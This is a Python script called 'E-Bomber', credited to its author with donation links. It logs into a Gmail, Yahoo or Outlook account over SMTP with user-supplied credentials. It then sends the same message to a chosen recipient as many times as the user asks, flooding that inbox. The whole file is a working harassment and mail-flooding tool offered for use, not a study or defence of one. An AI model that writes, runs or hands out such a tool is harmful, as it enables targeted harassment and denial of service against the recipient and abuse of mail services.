#CREDITS: GorioFuma
#GITHUB: https://github.com/GorioFuma
#INSTAGRAM: https://instagram.com/GorioFuma
#YOUTUBE: https://www.youtube.com/channel/UCgnL7U1bWnzjwGePCkIByCQ
#DONATIONS: https://paypal.me/GorioFuma

#IMPORT LIBRARIES
from os import system, name
from smtplib import SMTP_SSL as smtpserver
from time import sleep
from getpass import getpass
from sys import exit

#DEFINE CLEAR SCREEN FUNCTION
def clear():
    system("cls" if name == "nt" else "clear")

#START COLOR PROCESS
system("color")

#DEFINE COLORS
red   = '\33[31m'
green  = '\33[32m'
yellow = '\33[33m'
blue   = '\33[34m'
purple = '\33[35m'
cyan  = '\33[36m'
white = '\33[37m'

#DEFINE BANNER
def banner():
    title="""
 ______          ____                  _
|  ____|        |  _ \    ✹           | |
| |__    ______ | |_) | _/_  _ __ ___ | |__   ___ _ __
|  __|  |______||  _ < /   \| '_ ` _ \| '_ \ / _ \ '__|
| |____         | |_) |     | | | | | | |_) |  __/ |
|______|        |____/ \___/|_| |_| |_|_.__/ \___|_|
"""
    print(red+title)
    print(cyan+"GitHub: "+white+"https://github.com/GorioFuma")
    print(cyan+"Instagram: "+white+"https://instagram.com/GorioFuma")
    print(cyan+"Donations: "+white+"https://paypal.me/GorioFuma\n")
    
def log():
    global input_
    email_number=0
    email=input(white+"Email: ")
    password=getpass("Password: ")

    if input_==1: server=smtpserver("smtp.gmail.com", 465)
    if input_==2: server=smtpserver("smtp.yahoo.com", 465)
    if input_==3: server=smtpserver('smtp-mail.outlook.com', 465)

    try:
        server.login(email, password)
        print(green+"Login done!")
        sleep(0.75)
    except:
        print(yellow+"Something wrong!")
        sleep(0.75)
        exit()

    to=input(white+"To: ")
    subject=input("Subject (optional): ")
    subject=f"Subject: {subject}\n"
    message=input("Message: ")
    if not subject == "":
        message=subject+message

    amount=int(input("Amount: "))

    try:
        for mail in range(amount):
            server.sendmail(email, to, message)
            email_number+=1
            print(green+"Email sent: "+str(email_number))
        print(green+"Done! Total email sent: "+str(email_number))
        sleep(0.75)
        server.quit()
    except:
        print(yellow+"Something wrong!")
        sleep(0.75)
        exit()

#LOOP OF TOOL
while True:
    clear()
    banner()
    print(yellow+"--Choose your email server--------------------")
    print(green+"""01] Gmail server
02] Yahoo server (Not tested)
03] Outlook server (Not tested)
99] Exit""")
    print(yellow+"----------------------------------------------\n")
    try:
        input_=int(input(white+"E-Bomber:~$ "))
        if input_ < 1 or input_ > 3 and not input_ == 99:
            raise ValueError
    except ValueError:
        print(yellow+"Command not found!")
        sleep(0.75)

    if input_ == 99:
        exit()
    
    clear()
    banner()
    log()
